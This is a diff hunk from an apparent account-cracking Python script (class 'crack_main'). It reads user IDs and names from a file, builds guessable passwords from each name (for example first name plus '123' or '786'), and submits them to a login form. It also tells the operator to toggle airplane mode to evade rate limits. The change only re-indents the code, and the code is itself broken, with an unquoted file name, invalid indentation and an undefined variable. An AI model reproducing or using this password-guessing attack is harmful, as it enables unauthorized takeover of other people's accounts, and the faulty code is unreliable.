@@ -414,18 +414,18 @@ class crack_main():
                 print(' Cloning Is Started Wait For Results')
                 print(' After Every 5 Min Turn Airplane On/Off')
                 print(50*'=')
-                self.id = open(mail.txt).read().splitlines()
-                        for user in self.id:
-                                iid,names = user.split('|')
-                                first_name = names.rsplit(' ')[0]
-                                try:
-                                        last_name = names.rsplit(' ')[1]
-                                except IndexError:
-                                        last_name = 'Khan'
-                                fs = first_name.lower()
-                                ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                formSubmit.submit(self.m1,iid,name,passlist)
+                        self.id = open(mail.txt).read().splitlines()
+                                for user in self.id:
+                                        iid,names = user.split('|')
+                                        first_name = names.rsplit(' ')[0]
+                                        try:
+                                                last_name = names.rsplit(' ')[1]
+                                        except IndexError:
+                                                last_name = 'Khan'
+                                        fs = first_name.lower()
+                                        ls = last_name.lower()
+                                        passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                        formSubmit.submit(self.m1,iid,name,passlist)
                                 
                 
                 
